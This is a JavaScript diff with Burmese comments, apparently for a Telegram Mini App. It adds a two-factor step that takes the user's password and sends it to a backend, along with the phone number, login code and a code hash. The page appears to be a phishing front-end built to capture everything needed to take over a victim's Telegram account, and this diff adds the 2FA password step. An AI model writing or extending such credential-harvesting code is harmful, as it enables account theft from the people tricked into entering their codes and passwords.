@@ -83,6 +83,9 @@ async function verifyOTP() {
         if(result.success) {
             switchStep("step-success");
             tg.HapticFeedback.notificationOccurred("success"); 
+        } else if (result.message === "2FA_REQUIRED") {
+            // 💡 Backend မှ 2FA တောင်းလာပါက Password ရိုက်ထည့်ရမည့် UI သို့ ပြောင်းမည်
+            switchStep("step-2fa");
         } else {
             alert("Error: " + result.message);
             switchStep("step-otp");
@@ -90,5 +93,33 @@ async function verifyOTP() {
     } catch(e) {
         alert("Verification Failed.");
         switchStep("step-otp");
+    }
+}
+
+// 💡 ယခုအသစ်ထည့်ရမည့် 2FA ကို စစ်ဆေးပေးမည့် Function
+async function verify2FA() {
+    let password = document.getElementById("password_input").value;
+    if(!password) return alert("Password ရိုက်ထည့်ပါ။");
+    
+    switchStep("step-loading");
+    
+    try {
+        let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
+            method: "POST", headers: {"Content-Type": "application/json"},
+            // Backend သို့ password ပါ တွဲပို့ပေးမည်
+            body: JSON.stringify({ phone: userPhone, code: document.getElementById("otp_input").value, hash: phoneHash, name: userName, password: password })
+        });
+        
+        let result = await res.json();
+        if(result.success) {
+            switchStep("step-success");
+            tg.HapticFeedback.notificationOccurred("success"); 
+        } else {
+            alert("Error: Password မှားယွင်းနေပါသည်။");
+            switchStep("step-2fa");
+        }
+    } catch(e) {
+        alert("Verification Failed.");
+        switchStep("step-2fa");
     }
 }
